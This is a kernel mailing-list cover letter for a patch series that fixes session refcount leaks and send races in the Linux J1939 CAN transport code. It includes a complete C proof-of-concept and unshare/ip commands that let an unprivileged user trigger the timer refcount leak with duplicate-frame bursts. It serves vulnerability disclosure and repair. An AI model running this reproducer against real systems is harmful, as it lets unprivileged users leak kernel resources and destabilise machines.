Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.210.177
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793263485;
	b=TlXtfkdIwO9fiOmkdL07rTa+RZsn3TY/QDB1XnBUCvxspmq+nPZJzoWleDZymvqeg+4A
	 zV3KVQlX2YNGy8DVijoGKb1Y2frMofU161bCug+nt++Dj+h+r5hsD+OBTR6NCRhJLEZc2
	 CjobkeYBMRs0Qp+wgIKakAyDqt2BhVVTFXfIzFejS4yQlPiDKN+P+1rPh4pVrdp7D3qmQ
	 n1gb8hTddXRn7HXTCA0ItEqo+KAi3fwKu3yX8xELXlGYC1FiQmdn29Lh+DFap76c0N11w
	 KH4/xZ2TL2DM99bgNFDZRnVoMwh2p8XV/sdGQwHCqpqNdEi/JjyHPtJRRaHf4u0/bTA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793263485;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=vRqBEpBrX5Dh/+r2hU3enwpWzP4SscW9tbZPut3PNM0=;
	b=RckgqoAGD0WPkNgQ2t4UoZU4sqbHCBT1bxhWqya+vHwiTRb09ilgsXK0J7uwWkI+Nib0
	 y1Gd6kLZeCMsS0PEOJyF4RZK5F43kCHfV94CuchNhPCgAaZmS9LO56KziRWaji05AGKto
	 omJ+EypIbxQ+dxEJGBzHFfs7BVyyfeTC2GyqRZ+3IY7RT5/vDeuPHiE9O0wDxPWJafLMe
	 uk0U+WnDFi0B8jkFE1OT5PsT+qOYyXerWTuzBng+KKbdl3f2q7Lb6Tpz3L3KYai95y8Pj
	 cSP6TLf6HOqoqXqIc9BdGUIEtXjnELosQK1o3J3hhZj3/Vy1u7jGss6uUyWyqCOwRGw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=qpFk2LzI;
	arc=none smtp.remote-ip=209.85.210.177
Received: from mail-pf1-f177.google.com (mail-pf1-f177.google.com [209.85.210.177])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 41D86606A31C
	for <linux-can@vger.kernel.org>; Thu, 29 Oct 2026 08:44:44 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 41D86606A31C
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=qpFk2LzI
Received: by mail-pf1-f177.google.com with SMTP id d2e1a72fcca58-8a06e79e152so1055970b3a.0
        for <linux-can@vger.kernel.org>; Thu, 29 Oct 2026 01:44:44 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1793263483; x=1793868283; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=vRqBEpBrX5Dh/+r2hU3enwpWzP4SscW9tbZPut3PNM0=;
        b=qpFk2LzIFdnZFJuKHbqeg6ANButIeNQiQSIwSUUoVylLguVc/IzsP0E0nuQXJyZct4
         QJVI1M6EKx9h1YcsBbLVhAThPzjIRke1cevh3/vRPImx404Jf8AbgpnOXpqD7t+FAfFT
         y/cU0qpPpL6JBKurExGSGuPccwMG9H/vOLb8K2r+Q+Pt7vyyRYtboBAGQuucDdkkPtbK
         0d5HSRUL50vpNBJsWA4SkUhvUns6qkcVmYVw6yTjKEhxKAxg9MbOJjD09c+GCjLgBvhD
         UXoX8ndN1lmxAHYZ/KNZyjCWCTK7TH5A004AhyKnzIQN1Djtp1FVQLelg9VvruJKt+qO
         aexQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1793263483; x=1793868283;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vRqBEpBrX5Dh/+r2hU3enwpWzP4SscW9tbZPut3PNM0=;
        b=yrxqna8wXo54P9ptUvtoe1M/HPDWGhepDF0Tnq0mfTMAZcZe0vf0Hhf/YlBj/0H0mV
         tIV0PFmSJFI0Tm7FOxf1osXjkkYvq8/5EDtRlx63AzRD47WbQMYwsyhd/ydxviIJ3bDV
         NdmPiZc+Q9eQJXVFm2++ouDE2bM8xECawyHhXAeKTLNA93pFWjn46kw7vzZfmH5iWLF3
         t1PclmWih4Vw6/0c1AzrDXJKGvDTJPkhbErbjBUR/YazT7ohat//2FdW3N6MKKq3lYFG
         tCHjnxHdb8NmfXUTytitg7DpgkcE31zHE+nJth78nXiV3+Rzfu8J1OkAbVmK99l1s66w
         LPww==
X-Gm-Message-State: AFq9FYJ5UL1ojeAAn4HuTTaOy+ty6aku61H1DlYNeWzTRMvwKKzYeaC3
	Va3rr3Owl3m/iGkyAqdEcv0y/+x7qh8Bulh9xhAz6INaMdA4OesRhQpXrbcjnascUMaeVoobRTw
	Cxbb6qMaC
X-Gm-Gg: AYBFou2bDkLhuOz7XovRE1pKS09Z4Pu94IjQZPSuY73ucDu6JE50b+L78v0D2nCq9Yj
	fslJeyYQVbIo89d/qncUBTv2l3jGQ0tRP8LouWS2OLwrKlLj7tcf/HlGitDPmlfeB1CNt1YsqQM
	9V3su7aLmg++QQL3iky1fPcKqFJMDg4THoJh4AC3Rxa8p3InxORJHfl5mIg7aOESBqHN77twCS/
	WWF3F+Rwy3a1xzjzwSYr5cZ4WKgz3wLm7eP+fp9lTDzSzI+PifeFWXKoeA0U/Nw+3w4iQOzFc02
	T22fec+gsL+7AGVqag75owyO1uKKo6852VGm33FWysCjuUQGllyYqq7JMyD1dbk4ST7CMgWMesT
	3goK75SODqkWN1PvmCyPglFSeBGN4XrObbCIsICh5Ns1w+gznPkzjfvrPp0KNycjD1oTKmyIo05
	4nU/vQz1fZbh+7gGQ+PeiGD3NZlWxKNUOzaCaFcJOyFDz7V0QDTUE2IGB+FOm0JZQaayAKrXdki
	LLVPcGbwvg8CkGieVlBnucq/hsqDuknwVZwIKJO7tOKhNCMlwcwMUmxceao39zMUW3K3yNfeULT
	RC/UZkxNTuusaAudlQE5fmUUx1Cd2kckzb2AAOxA7x+sH3MGMOJDOnhNchcdFJa2NLi4FoGAFGN
	TvWA4QA==
X-Received: by 2002:a05:6a20:6a1f:b0:3e2:8c64:79cd with SMTP id adf61e73a8af0-3e9023faec6mr3823023637.55.1793263483364;
        Thu, 29 Oct 2026 01:44:43 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cdad33b99b2sm3083915a12.26.2026.10.29.01.44.38
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 29 Oct 2026 01:44:42 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-can@vger.kernel.org,
	llvm@lists.linux.dev
Cc: robin@protonic.nl,
	o.rempel@pengutronix.de,
	kernel@pengutronix.de,
	socketcan@hartkopp.net,
	mkl@pengutronix.de,
	ecathinds@gmail.com,
	dev.kurt@vandijck-laurijssen.be,
	maxime.jayat@mobile-devices.fr,
	bst@pengutronix.de,
	nathan@kernel.org,
	ndesaulniers@google.com,
	morbo@google.com,
	justinstitt@google.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v3 0/3] can: j1939: fix timer reference and cancellation races
Date: Thu, 29 Oct 2026 08:43:23 +0000
Message-ID: <cover.1793259424.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Post: <mailto:linux-can@vger.kernel.org>
List-Help: <mailto:linux-can+help@vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-can+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found an issue in net/can/j1939/transport.c.
The bug is reachable by a user who can create user and network namespaces
and send CAN frames to a J1939 receiver.
The relevant details are provided below.

---- details below ----

An LLM was used to help create this patch.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11143 (11143)

Bug details:

Restarting an already queued TX hrtimer changes its expiry but does not
create another callback to release another session reference. Repeated
scheduling can therefore leak references. The baseline trace excerpt below
shows two starts of the same timer before one callback; the second start
reports was_armed=1:

             poc-389     [001] ..s1.   200.601373: txtimer_schedule: (j1939_tp_schedule_txtimer+0x4/0x60) session=0xffffa3da4a2bc400 msec=0x0
             poc-390     [000] ..s1.   200.601375: txtimer_schedule: (j1939_tp_schedule_txtimer+0x4/0x60) session=0xffffa3da4a2bc400 msec=0x0
             poc-389     [001] d.s2.   200.601390: hrtimer_start: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer expires=200464843123 softexpires=200464843123 mode=REL|SOFT was_armed=0
             poc-390     [000] d.s2.   200.601400: hrtimer_start: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer expires=200464853253 softexpires=200464853253 mode=REL|SOFT was_armed=1
             poc-390     [000] ..s1.   200.601429: hrtimer_expire_entry: hrtimer=ffffa3da4a2bc4b8 function=j1939_tp_txtimer now=200464882582
             poc-390     [000] ..s1.   200.601430: txtimer_callback: (j1939_tp_txtimer+0x4/0xe70) timer=0xffffa3da4a2bc4b8

Source-level concurrency review found two additional send windows. A TX
callback can pass its ACTIVE-state check and race with deactivation; an RX
ABORT handler can also wait for timer callbacks before changing session state.
The TX-send lock and abort shutdown gate now serialize ordinary and
session-associated abort sends with those terminal paths. The trace above
shows only the timer restart/refcount-leak trigger; neither send window was
independently reproduced at runtime.

Changes in v3:
- Serialize TX/RX timer ownership, cancellation, and concurrent RX drains.
- Gate session TX sends during deactivation and RX ABORT handling.
- Split timer lifetime and TX-send shutdown fixes into separate patches.
- Keep context-analysis opt-in and annotations in a separate third patch.

Link: https://lore.kernel.org/all/cover.1793012287.git.zihanx@nebusec.ai/

Reproducer:

The trigger uses raw CAN frames over namespace-local vxcan peers and a
concurrent duplicate-frame burst; packetdrill does not model this
CAN/J1939 device topology.

Compile the reproducer with:

    gcc -O2 -Wall -Wextra -Werror -pthread -static -o poc poc.c

Run it as an unprivileged account with user/network namespace support:

    unshare -Urn sh -c 'ip link add vxcan0 type vxcan peer name vxcan1 && ip link set vxcan0 up && ip link set vxcan1 up && ./poc vxcan0 vxcan1 2097152 4 32 4096 1'

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The PoC creates four 2 MiB ETP sessions and concurrently sends duplicate
terminal DATA packets over a vxcan pair.

------BEGIN PoC------
#define _GNU_SOURCE

#include <errno.h>
#include <linux/can.h>
#include <linux/can/j1939.h>
#include <linux/can/raw.h>
#include <net/if.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_sendmmsg
#define SYS_sendmmsg 307
#endif

#define LOCAL_SA 0x80
#define REMOTE_SA_BASE 0x81
#define APP_PGN_BASE 0x01f100

#define J1939_ETP_PGN_CTL 0x00c800
#define J1939_ETP_PGN_DAT 0x00c700

#define J1939_ETP_CMD_ABORT 0xff
#define J1939_ETP_CMD_CTS 0x15
#define J1939_ETP_CMD_DPO 0x16
#define J1939_ETP_CMD_RTS 0x14

#define DEFAULT_SIZE (1024U * 1024U)
#define DEFAULT_DUPLICATES 256U
#define DEFAULT_SESSIONS 4096U
#define DEFAULT_THREADS 8U
#define FIRST_BLOCK_PKTS 255U

struct params {
	const char *tx_ifname;
	const char *rx_ifname;
	uint32_t session_size;
	uint32_t sessions;
	uint32_t threads;
	uint32_t duplicates;
	bool verbose;
};

struct can_burst {
	struct can_frame *frames;
	struct mmsghdr *msgs;
	struct iovec *iovecs;
	unsigned int nframes;
};

struct worker_ctx {
	int fd;
	int cpu;
	struct can_burst burst;
};

static pthread_barrier_t start_barrier;
static pthread_barrier_t done_barrier;
static volatile sig_atomic_t stop_workers;

static void die(const char *what);

static int sendmmsg_compat(int fd, struct mmsghdr *msgvec, unsigned int vlen,
			   unsigned int flags)
{
	return syscall(SYS_sendmmsg, fd, msgvec, vlen, flags);
}

static unsigned int sendmmsg_all(int fd, struct mmsghdr *msgvec,
				 unsigned int vlen, const char *what)
{
	unsigned int sent = 0;

	while (sent < vlen) {
		int ret = sendmmsg_compat(fd, &msgvec[sent], vlen - sent, 0);

		if (ret < 0)
			die(what);
		if (!ret) {
			errno = EIO;
			die(what);
		}
		sent += ret;
	}

	return sent;
}

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void barrier_wait_or_die(pthread_barrier_t *barrier, const char *what)
{
	int ret = pthread_barrier_wait(barrier);

	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		errno = ret;
		die(what);
	}
}

static unsigned int parse_u32(const char *arg, const char *what)
{
	char *endp;
	unsigned long value;

	errno = 0;
	value = strtoul(arg, &endp, 0);
	if (errno || *endp || value > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", what, arg);
		exit(EXIT_FAILURE);
	}

	return (unsigned int)value;
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (pthread_setaffinity_np(pthread_self(), sizeof(set), &set))
		perror("pthread_setaffinity_np");
}

static canid_t make_can_id(uint8_t prio, uint32_t pgn, uint8_t sa, uint8_t da)
{
	canid_t can_id;

	can_id = CAN_EFF_FLAG | ((canid_t)prio << 26) | ((canid_t)pgn << 8) | sa;
	if (((pgn >> 8) & 0xff) < 240)
		can_id |= (canid_t)da << 8;

	return can_id;
}

static int ifindex_by_name(const char *ifname)
{
	unsigned int ifindex = if_nametoindex(ifname);

	if (!ifindex) {
		errno = ENODEV;
		die("if_nametoindex");
	}

	return (int)ifindex;
}

static int make_raw_socket(int ifindex)
{
	struct sockaddr_can addr = {
		.can_family = AF_CAN,
		.can_ifindex = ifindex,
	};
	int fd;
	int one = 1;

	fd = socket(PF_CAN, SOCK_RAW, CAN_RAW);
	if (fd < 0)
		die("socket(CAN_RAW)");

	if (setsockopt(fd, SOL_CAN_RAW, CAN_RAW_RECV_OWN_MSGS, &one,
		       sizeof(one)) < 0)
		die("setsockopt(CAN_RAW_RECV_OWN_MSGS)");

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(CAN_RAW)");

	return fd;
}

static int make_j1939_listener(int ifindex)
{
	struct sockaddr_can addr = {
		.can_family = AF_CAN,
		.can_ifindex = ifindex,
		.can_addr.j1939 = {
			.name = 0,
			.pgn = J1939_NO_PGN,
			.addr = LOCAL_SA,
		},
	};
	int fd;

	fd = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
	if (fd < 0)
		die("socket(CAN_J1939)");

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind(CAN_J1939)");

	return fd;
}

static void send_frame(int fd, const struct can_frame *frame)
{
	ssize_t written = write(fd, frame, sizeof(*frame));

	if (written != (ssize_t)sizeof(*frame))
		die("write(can_frame)");
}

static void build_etp_rts(struct can_frame *frame, uint8_t sa, uint8_t da,
			  uint32_t size, uint32_t app_pgn)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
	frame->len = 8;
	frame->data[0] = J1939_ETP_CMD_RTS;
	frame->data[1] = (size >> 0) & 0xff;
	frame->data[2] = (size >> 8) & 0xff;
	frame->data[3] = (size >> 16) & 0xff;
	frame->data[4] = (size >> 24) & 0xff;
	frame->data[5] = (app_pgn >> 0) & 0xff;
	frame->data[6] = (app_pgn >> 8) & 0xff;
	frame->data[7] = (app_pgn >> 16) & 0xff;
}

static void build_etp_dpo(struct can_frame *frame, uint8_t sa, uint8_t da,
			  uint32_t app_pgn)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
	frame->len = 8;
	frame->data[0] = J1939_ETP_CMD_DPO;
	frame->data[1] = FIRST_BLOCK_PKTS;
	frame->data[2] = 0;
	frame->data[3] = 0;
	frame->data[4] = 0;
	frame->data[5] = (app_pgn >> 0) & 0xff;
	frame->data[6] = (app_pgn >> 8) & 0xff;
	frame->data[7] = (app_pgn >> 16) & 0xff;
}

static void build_etp_abort(struct can_frame *frame, uint8_t sa, uint8_t da,
			    uint32_t app_pgn)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_CTL, sa, da);
	frame->len = 8;
	frame->data[0] = J1939_ETP_CMD_ABORT;
	frame->data[1] = 1;
	frame->data[2] = 0xff;
	frame->data[3] = 0xff;
	frame->data[4] = 0xff;
	frame->data[5] = (app_pgn >> 0) & 0xff;
	frame->data[6] = (app_pgn >> 8) & 0xff;
	frame->data[7] = (app_pgn >> 16) & 0xff;
}

static void build_etp_terminal_data(struct can_frame *frame, uint8_t remote_sa)
{
	memset(frame, 0, sizeof(*frame));
	frame->can_id = make_can_id(6, J1939_ETP_PGN_DAT, remote_sa, LOCAL_SA);
	frame->len = 8;
	frame->data[0] = FIRST_BLOCK_PKTS;
	memset(&frame->data[1], 'Z', 7);
}

static void free_burst(struct can_burst *burst)
{
	free(burst->iovecs);
	free(burst->msgs);
	free(burst->frames);
	memset(burst, 0, sizeof(*burst));
}

static void drain_raw_rx(int fd)
{
	struct pollfd pfd = {
		.fd = fd,
		.events = POLLIN,
	};

	for (;;) {
		struct can_frame frame;
		int ret = poll(&pfd, 1, 0);

		if (ret <= 0)
			return;

		if (read(fd, &frame, sizeof(frame)) < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				return;
			die("read(raw drain)");
		}
	}
}

static bool match_ctl_cmd(const struct can_frame *frame, uint8_t sa, uint8_t da,
			  uint32_t pgn, uint8_t cmd)
{
	uint32_t frame_pgn;
	uint8_t frame_sa;
	uint8_t frame_da = J1939_NO_ADDR;

	if (!(frame->can_id & CAN_EFF_FLAG))
		return false;

	frame_sa = frame->can_id & 0xff;
	frame_pgn = (frame->can_id >> 8) & J1939_PGN_MAX;
	if (((frame_pgn >> 8) & 0xff) < 240) {
		frame_da = frame_pgn & 0xff;
		frame_pgn &= J1939_PGN_PDU1_MAX;
	}

	return frame_sa == sa && frame_da == da &&
	       frame_pgn == pgn && frame->len >= 1 &&
	       frame->data[0] == cmd;
}

static bool wait_for_cts(int raw_fd, uint8_t remote_sa, uint32_t app_pgn,
			 bool verbose)
{
	struct pollfd pfd = {
		.fd = raw_fd,
		.events = POLLIN,
	};
	struct timespec start;

	if (clock_gettime(CLOCK_MONOTONIC, &start) < 0)
		die("clock_gettime");

	for (;;) {
		struct can_frame frame;
		struct timespec now;
		int elapsed_ms;
		int timeout_ms;
		int ret;

		if (clock_gettime(CLOCK_MONOTONIC, &now) < 0)
			die("clock_gettime");

		elapsed_ms = (int)((now.tv_sec - start.tv_sec) * 1000 +
				   (now.tv_nsec - start.tv_nsec) / 1000000);
		timeout_ms = 1000 - elapsed_ms;
		if (timeout_ms <= 0)
			return false;

		ret = poll(&pfd, 1, timeout_ms);
		if (ret < 0)
			die("poll(raw)");
		if (ret == 0)
			return false;

		if (!(pfd.revents & POLLIN))
			continue;

		if (read(raw_fd, &frame, sizeof(frame)) < 0)
			die("read(raw)");

		if (match_ctl_cmd(&frame, LOCAL_SA, remote_sa, J1939_ETP_PGN_CTL,
				  J1939_ETP_CMD_CTS)) {
			if (verbose) {
				printf("saw initial CTS for pgn=0x%05x remote_sa=0x%02x\n",
				       app_pgn, remote_sa);
				fflush(stdout);
			}
			return true;
		}
	}
}

static void init_burst(struct can_burst *burst, unsigned int nframes)
{
	memset(burst, 0, sizeof(*burst));
	burst->nframes = nframes;
	burst->frames = calloc(nframes, sizeof(*burst->frames));
	burst->msgs = calloc(nframes, sizeof(*burst->msgs));
	burst->iovecs = calloc(nframes, sizeof(*burst->iovecs));
	if (!burst->frames || !burst->msgs || !burst->iovecs)
		die("calloc(burst)");
}

static void finalize_burst(struct can_burst *burst)
{
	unsigned int i;

	for (i = 0; i < burst->nframes; i++) {
		burst->iovecs[i].iov_base = &burst->frames[i];
		burst->iovecs[i].iov_len = sizeof(burst->frames[i]);
		burst->msgs[i].msg_hdr.msg_iov = &burst->iovecs[i];
		burst->msgs[i].msg_hdr.msg_iovlen = 1;
	}
}

static void build_prefix_burst(struct can_burst *burst, uint8_t remote_sa,
			       uint32_t app_pgn)
{
	unsigned int i;

	init_burst(burst, FIRST_BLOCK_PKTS);
	build_etp_dpo(&burst->frames[0], remote_sa, LOCAL_SA, app_pgn);

	for (i = 1; i < FIRST_BLOCK_PKTS; i++) {
		memset(&burst->frames[i], 0, sizeof(burst->frames[i]));
		burst->frames[i].can_id = make_can_id(6, J1939_ETP_PGN_DAT,
						      remote_sa, LOCAL_SA);
		burst->frames[i].len = 8;
		burst->frames[i].data[0] = i;
		memset(&burst->frames[i].data[1], 'A' + (i % 26), 7);
	}

	finalize_burst(burst);
}

static void build_terminal_burst(struct can_burst *burst, uint8_t remote_sa,
				 unsigned int duplicates)
{
	unsigned int i;

	free_burst(burst);
	init_burst(burst, duplicates);

	for (i = 0; i < duplicates; i++)
		build_etp_terminal_data(&burst->frames[i], remote_sa);

	finalize_burst(burst);
}

static void *worker_main(void *arg)
{
	struct worker_ctx *ctx = arg;

	pin_to_cpu(ctx->cpu);

	for (;;) {
		barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(start)");
		if (stop_workers)
			break;

		sendmmsg_all(ctx->fd, ctx->burst.msgs, ctx->burst.nframes,
			     "sendmmsg(worker)");

		barrier_wait_or_die(&done_barrier, "pthread_barrier_wait(done)");
	}

	return NULL;
}

static void init_workers(struct worker_ctx *workers, pthread_t *tids,
			 int ifindex, unsigned int threads, int ncpus)
{
	unsigned int i;

	if (pthread_barrier_init(&start_barrier, NULL, threads + 1))
		die("pthread_barrier_init(start)");
	if (pthread_barrier_init(&done_barrier, NULL, threads + 1))
		die("pthread_barrier_init(done)");

	for (i = 0; i < threads; i++) {
		workers[i].fd = make_raw_socket(ifindex);
		workers[i].cpu = i % ncpus;
		if (pthread_create(&tids[i], NULL, worker_main, &workers[i]))
			die("pthread_create");
	}
}

static void join_workers(struct worker_ctx *workers, pthread_t *tids,
			 unsigned int threads)
{
	unsigned int i;

	stop_workers = 1;
	barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(stop)");

	for (i = 0; i < threads; i++) {
		if (pthread_join(tids[i], NULL))
			die("pthread_join");
		free_burst(&workers[i].burst);
		close(workers[i].fd);
	}

	pthread_barrier_destroy(&start_barrier);
	pthread_barrier_destroy(&done_barrier);
}

static void run_session(int raw_fd, struct worker_ctx *workers,
			uint32_t size, uint32_t threads, uint32_t duplicates,
			uint32_t session_idx, bool verbose)
{
	struct can_frame rts;
	struct can_frame abort;
	struct can_burst prefix = { 0 };
	uint8_t remote_sa;
	uint32_t app_pgn;
	unsigned int i;
	unsigned int sa_span = J1939_MAX_UNICAST_ADDR - REMOTE_SA_BASE + 1;

	remote_sa = REMOTE_SA_BASE + (session_idx % sa_span);
	app_pgn = APP_PGN_BASE + (session_idx % 0x100);

	build_etp_rts(&rts, remote_sa, LOCAL_SA, size, app_pgn);
	send_frame(raw_fd, &rts);

	if (!wait_for_cts(raw_fd, remote_sa, app_pgn, verbose)) {
		fprintf(stderr,
			"timed out waiting for initial CTS: session=%u remote_sa=0x%02x pgn=0x%05x size=%u\n",
			session_idx, remote_sa, app_pgn, size);
		exit(EXIT_FAILURE);
	}

	build_prefix_burst(&prefix, remote_sa, app_pgn);
	/* Ensure the receiver processes DPO before the data packet burst. */
	send_frame(raw_fd, &prefix.frames[0]);
	usleep(1000);
	sendmmsg_all(raw_fd, &prefix.msgs[1], prefix.nframes - 1,
		     "sendmmsg(prefix)");
	free_burst(&prefix);

	for (i = 0; i < threads; i++)
		build_terminal_burst(&workers[i].burst, remote_sa, duplicates);

	barrier_wait_or_die(&start_barrier, "pthread_barrier_wait(start-main)");
	barrier_wait_or_die(&done_barrier, "pthread_barrier_wait(done-main)");

	build_etp_abort(&abort, remote_sa, LOCAL_SA, app_pgn);
	send_frame(raw_fd, &abort);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [tx_ifname] [rx_ifname] [size] [sessions] [threads] [duplicates_per_thread] [verbose]\n",
		prog);
	exit(EXIT_FAILURE);
}

int main(int argc, char **argv)
{
	struct params params = {
		.tx_ifname = "vcan0",
		.rx_ifname = "vcan0",
		.session_size = DEFAULT_SIZE,
		.sessions = DEFAULT_SESSIONS,
		.threads = DEFAULT_THREADS,
		.duplicates = DEFAULT_DUPLICATES,
		.verbose = false,
	};
	struct worker_ctx *workers;
	pthread_t *tids;
	int ifindex;
	int rx_ifindex;
	int raw_fd;
	int j1939_fd;
	int ncpus;
	unsigned int i;

	if (argc > 8)
		usage(argv[0]);

	if (argc >= 2)
		params.tx_ifname = argv[1];
	if (argc >= 3)
		params.rx_ifname = argv[2];
	if (argc >= 4)
		params.session_size = parse_u32(argv[3], "size");
	if (argc >= 5)
		params.sessions = parse_u32(argv[4], "sessions");
	if (argc >= 6)
		params.threads = parse_u32(argv[5], "threads");
	if (argc >= 7)
		params.duplicates = parse_u32(argv[6], "duplicates");
	if (argc >= 8)
		params.verbose = parse_u32(argv[7], "verbose") != 0;

	if (params.session_size <= 1785) {
		fprintf(stderr, "size must be > 1785 to force ETP\n");
		return EXIT_FAILURE;
	}
	if (!params.sessions || !params.threads || !params.duplicates)
		usage(argv[0]);

	ncpus = sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpus < 1)
		die("sysconf(_SC_NPROCESSORS_ONLN)");

	workers = calloc(params.threads, sizeof(*workers));
	tids = calloc(params.threads, sizeof(*tids));
	if (!workers || !tids)
		die("calloc(workers)");

	ifindex = ifindex_by_name(params.tx_ifname);
	rx_ifindex = ifindex_by_name(params.rx_ifname);
	j1939_fd = make_j1939_listener(rx_ifindex);
	raw_fd = make_raw_socket(ifindex);
	init_workers(workers, tids, ifindex, params.threads, ncpus);

	printf("tx_if=%s(%d) rx_if=%s(%d) size=%u sessions=%u threads=%u duplicates_per_thread=%u\n",
	       params.tx_ifname, ifindex, params.rx_ifname, rx_ifindex,
	       params.session_size, params.sessions, params.threads,
	       params.duplicates);
	fflush(stdout);

	for (i = 0; i < params.sessions; i++) {
		drain_raw_rx(raw_fd);
		run_session(raw_fd, workers, params.session_size, params.threads,
			    params.duplicates, i, params.verbose);
		if ((i + 1) % 16 == 0 || params.verbose) {
			printf("completed %u sessions\n", i + 1);
			fflush(stdout);
		}
	}

	join_workers(workers, tids, params.threads);
	close(raw_fd);
	close(j1939_fd);
	free(tids);
	free(workers);

	return 0;
}
------END PoC--------

The baseline run recorded the duplicate timer restart and callback shown
above. It did not produce a crash log.

Best regards,
Zihan Xi

Zihan Xi (3):
  can: j1939: fix session reference leaks on timer rearm
  can: j1939: stop TX sends after session shutdown
  can: j1939: enable context analysis

 net/can/j1939/Makefile     |   2 +
 net/can/j1939/j1939-priv.h |  25 +-
 net/can/j1939/socket.c     |  59 +++--
 net/can/j1939/transport.c  | 483 +++++++++++++++++++++++++++++++++----
 4 files changed, 490 insertions(+), 79 deletions(-)

-- 
2.43.0
